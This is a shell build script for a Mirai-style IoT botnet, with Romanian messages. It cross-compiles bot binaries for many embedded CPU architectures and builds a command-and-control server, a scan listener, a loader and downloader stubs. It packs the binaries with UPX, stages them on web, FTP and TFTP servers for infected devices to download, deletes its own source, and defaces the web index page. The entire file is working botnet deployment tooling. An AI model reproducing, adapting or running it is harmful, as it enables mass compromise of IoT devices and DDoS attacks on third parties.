#!/bin/bash
yum install figlet -y
clear
figlet "WhiteHat Build Incepe"
printf "\n"
printf "\n"
printf "\x1b[0;37m[\x1b[0;31mCheck\x1b[0;37m] \x1b[0;31- \x1b[0;37m Exportez Bins.\n"
printf "\n"
printf "\n"
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
printf "\n"
printf "\n"
printf "\x1b[0;37m[\x1b[0;31mCheck\x1b[0;37m] \x1b[0;31- \x1b[0;37m Creez Bins in FTP-HTML-TFTP.\n"
printf "\n"
printf "\n"
rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp
mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/d
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/
go build -o loader/scanListen scanListen.go

printf "\n"
printf "\n"
printf "\x1b[0;37m[\x1b[0;31mCheck\x1b[0;37m] \x1b[0;31- \x1b[0;37m Compiler bins.\n"
printf "\n"
printf "\n"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m i586.\n"
compile_bot i586 xd.x86 "-static -DCUM_KILLER"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m mips.\n"
compile_bot mips xd.mips "-static -DCUM_KILLER"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m mipsel.\n"
compile_bot mipsel xd.mpsl "-static -DCUM_KILLER"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m arm4l.\n"
compile_bot armv4l xd.arm "-static -DCUM_KILLER"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m arm5l.\n"
compile_bot armv5l xd.arm5 "-static -DCUM_KILLER"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m arm6l.\n"
compile_bot armv6l xd.arm6 "-static -DCUM_KILLER"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m arm7l.\n"
compile_bot armv7l xd.arm7 "-static -DCUM_KILLER"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m powerpc.\n"
compile_bot powerpc xd.ppc "-static -DCUM_KILLER"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m sparc.\n"
compile_bot sparc xd.spc "-static -DCUM_KILLER"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m m68k.\n"
compile_bot m68k xd.m68k "-statiC -DCUM_KILLER"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m sh4.\n"
compile_bot sh4 xd.sh4 "-static -DCUM_KILLER"

cp release/xd.* /var/www/html/d
cp release/xd.* /var/ftp
mv release/xd.* /var/lib/tftpboot
rm -rf release
printf "\n"
printf "\n"
printf "\x1b[0;37m[\x1b[0;31mCheck\x1b[0;37m] \x1b[0;31- \x1b[0;37m Compiler-ul a ajuns la final.\n"
printf "\n"
printf "\n"

gcc -static -O3 -lpthread -pthread ~/loader/src/*.c -o ~/loader/loader

printf "\n"
printf "\n"
printf "\x1b[0;37m[\x1b[0;31mCheck\x1b[0;37m] \x1b[0;31- \x1b[0;37m Creez Loader.\n"
printf "\n"
printf "\n"

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.spc
armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm7
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.spc
mv ~/dlr/release/dlr* ~/loader/bins
rm -rf ~/dlr ~/loader/src ~/bot ~/scanListen.go ~/Projects ~/build.sh ~/dependency.sh

echo "<center>*************************<br>WhiteHat Date Private. Daca vezi asta si esti un cautator de IoT atunci suge-o -U.S.<br>*************************</center>" >> /var/www/html/index.html

wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
tar -xvf *.xz
mv upx*/upx .
./upx --ultra-brute /var/www/html/d/*
./upx --ultra-brute /var/lib/tftpboot/*
rm -rf upx*
clear
printf "\n"
printf "\n"
printf "\x1b[0;37m[\x1b[0;31mCheck\x1b[0;37m] \x1b[0;31- \x1b[0;37m Build-ul sa terminat.\n"
printf "\n"
printf "\n"
printf "\x1b[0;37m[\x1b[0;31mCheck\x1b[0;37m] \x1b[0;31- \x1b[0;37m Creez PayLoad.\n"
printf "\n"
printf "\n"
python buildpayload.py